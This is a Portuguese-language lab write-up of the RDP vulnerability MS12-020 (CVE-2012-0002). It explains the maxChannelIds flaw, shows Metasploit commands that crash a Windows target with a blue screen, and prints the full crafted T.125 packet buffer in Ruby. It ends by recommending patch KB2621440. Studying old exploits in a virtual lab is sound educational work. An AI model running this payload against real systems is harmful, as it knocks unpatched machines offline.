# Exploring-MS12-020 / CVE-2012-0002

***"The Microsoft Remote Desktop Protocol (RDP) provides remote display
and input capabilities over network connections for Windows-based
applications running on a server. RDP is designed to support different
types of network topologies and multiple LAN protocols."***

 - O RDP é usado pelo "Terminal Services e Remote Desktop Services" e
   funciona no nível de kernel na porta 3389.
   
  - Existe uma vulnerabilidade que ocorre no manuseio do apontador
   pendente no campo maxChannelsIds do pacote T.125 ConnectMCSPDU que
   fica nesse estado de vulnerabilidade quando setado para menor/igual ao número 5.
   
  - Observe que nas versões do Windows pós-Vista (como 7 e 2008) "parece"
   necessário ter "Permitir conexões de computadores executando qualquer
   versão da área de trabalho remota "por ser vulnerável.
   
   - A code-exec ocorre durante a desconexão usuário. A capacidade de
   exploração depende da possibilidade de controlar o ESI ou o conteúdo
   apontado por ele.

![](https://ifconfig.dk/wp-content/uploads/2014/02/RDPkill1.png)

# Metasploit 

```console
root@kali# msfconsole

msf5 > use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
msf5 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > set RHOSTS 192.168.X.X
msf5 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) > run
```

A máquina Windows será paralisada, causando a famosa "TELA AZUL DA MORTE"

# Instalações
Para entender como criar e instalar uma VM com o SO - Win 7, recomendo acessar o seguinte link: [https://www.comoinstalar.com.br/virtualizacao/como-instalar-o-windows-7/](https://www.comoinstalar.com.br/virtualizacao/como-instalar-o-windows-7/) 

E para fazer a instalação do VirtualBox :
[https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads) 


# Código

O buffer que deve ser adicionado é o seguinte:

```ruby
pkt = ''+
      "\x03\x00\x00\x13" +  # TPKT: version + length
      "\x0E\xE0\x00\x00" +  # X.224 (connection request)
      "\x00\x00\x00\x01" +
      "\x00\x08\x00\x00" +
      "\x00\x00\x00"     +
      "\x03\x00\x00\x6A" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224 (connect-initial)
      "\x7F\x65\x82\x00" +  # T.125
      "\x5E"             +
      "\x04\x01\x01"     +  # callingDomainSelector
      "\x04\x01\x01"     +  # calledDomainSelector
      "\x01\x01\xFF"     +  # upwardFlag
      "\x30\x19"         +  # targetParameters
      max_channel_ids    +  # maxChannelIds
      "\x02\x01\xFF"     +  # maxUserIds
      "\x02\x01\x00"     +  # maxTokenIds
      "\x02\x01\x01"     +  # numPriorities
      "\x02\x01\x00"     +  # minThroughput
      "\x02\x01\x01"     +  # maxHeight
      "\x02\x02\x00\x7C" +  # maxMCSPDUsize
      "\x02\x01\x02"     +  # protocolVersion
      "\x30\x19"         +  # minimumParameters
      max_channel_ids    +  # maxChannelIds
      "\x02\x01\xFF"     +  # maxUserIds
      "\x02\x01\x00"     +  # maxTokenIds
      "\x02\x01\x01"     +  # numPriorities
      "\x02\x01\x00"     +  # minThroughput
      "\x02\x01\x01"     +  # maxHeight
      "\x02\x02\x00\x7C" +  # maxMCSPDUsize
      "\x02\x01\x02"     +  # protocolVersion
      "\x30\x19"         +  # maximumParameters
      max_channel_ids    +  # maxChannelIds
      "\x02\x01\xFF"     +  # maxUserIds
      "\x02\x01\x00"     +  # maxTokenIds
      "\x02\x01\x01"     +  # numPriorities
      "\x02\x01\x00"     +  # minThroughput
      "\x02\x01\x01"     +  # maxHeight
      "\x02\x02\x00\x7C" +  # maxMCSPDUsize
      "\x02\x01\x02"     +  # protocolVersion
      "\x04\x82\x00\x00" +  # userData
      "\x03\x00\x00\x08" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x28"             +  # T.125
      "\x03\x00\x00\x08" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x28"             +  # T.125
      "\x03\x00\x00\x08" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x28"             +  # T.125
      "\x03\x00\x00\x08" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x28"             +  # T.125
      "\x03\x00\x00\x08" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x28"             +  # T.125
      "\x03\x00\x00\x08" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x28"             +  # T.125
      "\x03\x00\x00\x08" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x28"             +  # T.125
      "\x03\x00\x00\x08" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x28"             +  # T.125
      "\x03\x00\x00\x0C" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x38\x00\x06\x03" +  # T.125
      "\xF0"             +
      "\x03\x00\x00\x09" +  # TPKT: version + length
      "\x02\xF0\x80"     +  # X.224
      "\x21\x80"            # T.125
```
Por fim, a instalação da atualização de segurança KB2621440 através da atualização do Windows fecha está vulnerabilidade. Com isso, espero que prove meu ponto de sempre manter seu sistema atualizado.
